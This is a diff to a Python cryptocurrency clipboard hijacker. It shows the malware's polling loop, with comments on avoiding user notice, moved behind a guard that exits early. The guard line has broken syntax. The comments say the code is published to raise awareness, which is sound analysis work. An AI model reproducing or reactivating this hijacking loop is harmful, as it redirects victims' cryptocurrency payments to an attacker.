@@ -322,21 +322,26 @@ def main():
             pass
         sys.exit(0)
 
-# call main function to run the script
-main()
-# this is the main loop that will create an instance of the Hijacker_Main class and call the hijack function every 0.5 seconds to check the clipboard content and replace it if it matches one of the coin address patterns
-while True:
-    # get an instance of the Hijacker_Main class, this is the code that will create an instance of the Hijacker_Main class, which will initialize the regex patterns and the address map, and also import the pyperclip module
-    hijacker = Hijacker_Main()
-    # execute the hijack function to check the clipboard content and replace it if it matches one of the coin address patterns, 
-    # this is the code that will call the hijack function every 0.5 seconds to check the clipboard content and replace it if it matches one of the coin address patterns
-    hijacker.hijack()
-    # this is the code that will sleep for 0.5 seconds before checking the clipboard content again, this is just to prevent the script from using too much CPU resources by checking the clipboard content too frequently,
-    # and also to make it less noticeable by the user, because if it checks the clipboard content every second or something, it might cause some lag or something, but with 0.5 seconds, it is less likely to cause any noticeable lag or something
-    # end's comment: why the attacker is using time.sleep(0.5)? attacker can use a more efficient way to check the clipboard content, for example using a clipboard listener or something, 
-    # instead of using an infinite loop with time.sleep, which is just a dumb way to do it, but hey, it works, even if it is really bad, but it is what it is.
-    time.sleep(0.5)
+if __name__ == __main__
+    print("Executing is not allowed.")
+    system("pause")
+    sys.exit(0)
+    # call main function to run the script
+    main()
+    # this is the main loop that will create an instance of the Hijacker_Main class and call the hijack function every 0.5 seconds to check the clipboard content and replace it if it matches one of the coin address patterns
+    while True:
+        # get an instance of the Hijacker_Main class, this is the code that will create an instance of the Hijacker_Main class, which will initialize the regex patterns and the address map, and also import the pyperclip module
+        hijacker = Hijacker_Main()
+        # execute the hijack function to check the clipboard content and replace it if it matches one of the coin address patterns, 
+        # this is the code that will call the hijack function every 0.5 seconds to check the clipboard content and replace it if it matches one of the coin address patterns
+        hijacker.hijack()
+        # this is the code that will sleep for 0.5 seconds before checking the clipboard content again, this is just to prevent the script from using too much CPU resources by checking the clipboard content too frequently,
+        # and also to make it less noticeable by the user, because if it checks the clipboard content every second or something, it might cause some lag or something, but with 0.5 seconds, it is less likely to cause any noticeable lag or something
+        # end's comment: why the attacker is using time.sleep(0.5)? attacker can use a more efficient way to check the clipboard content, for example using a clipboard listener or something, 
+        # instead of using an infinite loop with time.sleep, which is just a dumb way to do it, but hey, it works, even if it is really bad, but it is what it is.
+        time.sleep(0.5)
 
 # Short review: This code is a clipboard hijacker that will replace any cryptocurrency address copied to the clipboard with the attacker's address.
 # It also has a fake optimization window that will show when the script is run without any arguments. The code is really bad and full of dumb ways to do things, but it works, even if it is really bad, but it is what it is.
+
 # so we (endreached only) TeamStella decided to publish this code to github to raise awareness about clipboard hijackers and how they work, and also to show how bad the coding style of the attacker is, but it is what it is.
